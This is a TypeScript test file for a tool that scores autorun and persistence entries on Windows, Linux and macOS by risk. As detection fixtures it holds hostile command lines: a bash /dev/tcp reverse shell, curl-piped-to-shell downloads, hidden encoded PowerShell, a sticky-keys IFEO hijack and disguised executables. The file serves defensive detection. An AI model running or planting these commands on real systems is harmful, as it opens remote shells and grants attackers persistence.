import { describe, expect, it } from "vitest";
import { HostAutorun, assessFoothold, footholdFingerprint } from "./footholds.js";

const entry = (over: Partial<HostAutorun> & Pick<HostAutorun, "kind">): HostAutorun =>
  HostAutorun.parse({ location: "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", name: "entry", command: null, ...over });

describe("footholdFingerprint", () => {
  it("groups the same entry across users and ignores case and spacing", () => {
    const a = footholdFingerprint({ kind: "run_key", location: "HKU\\S-1-5-21-111-222-333-1001\\Run", name: "Teams", command: 'C:\\Users\\amina\\AppData\\Local\\Teams.exe  --process-start-args' });
    const b = footholdFingerprint({ kind: "run_key", location: "HKU\\S-1-5-21-111-222-333-1002\\Run", name: "teams", command: "c:\\users\\joseph\\appdata\\local\\teams.exe --process-start-args" });
    expect(a).toMatch(/^[0-9a-f]{16}$/);
    expect(a).toBe(b);
    expect(footholdFingerprint({ kind: "cron", location: "/home/amina/.crontab", name: "x", command: "/home/amina/bin/backup" })).toBe(
      footholdFingerprint({ kind: "cron", location: "/home/joseph/.crontab", name: "x", command: "/home/joseph/bin/backup" }),
    );
    expect(a).not.toBe(footholdFingerprint({ kind: "run_key", location: "HKU\\S-1-5-21-1\\Run", name: "Teams", command: "C:\\evil\\teams.exe" }));
  });
});

describe("assessFoothold", () => {
  it("rates common legitimate entries low", () => {
    expect(assessFoothold(entry({ kind: "run_key", name: "SecurityHealth", command: "%windir%\\system32\\SecurityHealthSystray.exe", signed: true })).level).toBe("low");
    expect(assessFoothold(entry({ kind: "service", name: "Spooler", command: "C:\\Windows\\System32\\spoolsv.exe" })).level).toBe("low");
    expect(assessFoothold(entry({ kind: "systemd", location: "/etc/systemd/system/nginx.service", name: "nginx", command: "/usr/sbin/nginx -g daemon on;" })).level).toBe("low");
    expect(assessFoothold(entry({ kind: "launch_daemon", location: "/Library/LaunchDaemons/com.microsoft.autoupdate.helper.plist", name: "com.microsoft.autoupdate.helper", command: "/Library/Application Support/Microsoft/MAU2.0/helper" })).level).toBe("low");
  });

  it("flags encoded PowerShell from a temp folder as high, with reasons", () => {
    const r = assessFoothold(entry({ kind: "scheduled_task", location: "\\Updater", name: "Updater", command: "powershell.exe -nop -w hidden -enc SQBFAFgA C:\\Users\\Public\\u.ps1" }));
    expect(r.level).toBe("high");
    expect(r.reasons.map((x) => x.text)).toEqual(expect.arrayContaining(["Encoded or obfuscated PowerShell", "PowerShell with a hidden window", "Runs from a temporary or user-writable folder", "Starts a script file (.vbs, .js, .hta, .bat, .ps1…)"]));
    expect(r.score).toBeLessThanOrEqual(100);
  });

  it("flags download-and-run, reverse shells, look-alikes and unsigned programs", () => {
    expect(assessFoothold(entry({ kind: "cron", location: "/var/spool/cron/crontabs/root", name: "*/5 * * * *", command: "curl -fsSL https://get.example.com/x.sh | sh" })).level).toBe("medium");
    expect(assessFoothold(entry({ kind: "cron", location: "/var/spool/cron/crontabs/root", name: "*/5 * * * *", command: "curl -fsSL http://45.9.1.2/x.sh | sh" })).level).toBe("high");
    expect(assessFoothold(entry({ kind: "shell_profile", location: "/root/.bashrc", name: "line 9", command: "nohup bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 &" })).level).toBe("high");
    expect(assessFoothold(entry({ kind: "cron", location: "/etc/cron.d/sys", name: "@reboot", command: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" })).reasons[0]!.text).toBe("Opens a remote shell");
    const fake = assessFoothold(entry({ kind: "run_key", name: "Windows Host", command: "C:\\Users\\amina\\AppData\\Roaming\\svchost.exe", signed: false }));
    expect(fake.level).toBe("high");
    expect(fake.reasons.map((x) => x.text)).toContain("Program is not signed by a trusted publisher");
    expect(assessFoothold(entry({ kind: "startup_folder", name: "invoice.pdf.exe", command: "C:\\Users\\a\\Downloads\\invoice.pdf.exe" })).level).toBe("high");
    expect(assessFoothold(entry({ kind: "ifeo", name: "sethc.exe", command: "C:\\Windows\\System32\\cmd.exe" })).level).toBe("high");
    expect(assessFoothold(entry({ kind: "ifeo", name: "chrome.exe", command: "C:\\Tools\\vsjitdebugger.exe" })).level).toBe("medium");
  });

  it("notes SSH keys, more so for root", () => {
    expect(assessFoothold(entry({ kind: "ssh_key", location: "/home/ops/.ssh/authorized_keys", name: "ops@laptop", command: "ssh-ed25519 ops@laptop …Xk2Q", user: "ops" })).level).toBe("low");
    expect(assessFoothold(entry({ kind: "ssh_key", location: "/root/.ssh/authorized_keys", name: "unknown", command: "ssh-rsa …AAAB", user: "root" })).level).toBe("medium");
  });
});

describe("assessFoothold edge cases", () => {
  it("treats the stock Winlogon shell as normal", () => {
    expect(assessFoothold(entry({ kind: "winlogon", location: "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", name: "Shell", command: "explorer.exe" })).level).toBe("low");
    expect(assessFoothold(entry({ kind: "winlogon", location: "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", name: "Shell", command: "C:\\Windows\\explorer.exe" })).level).toBe("low");
    expect(assessFoothold(entry({ kind: "winlogon", location: "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", name: "Shell", command: "explorer.exe, C:\\ProgramData\\explorer.exe" })).level).toBe("medium");
  });
});
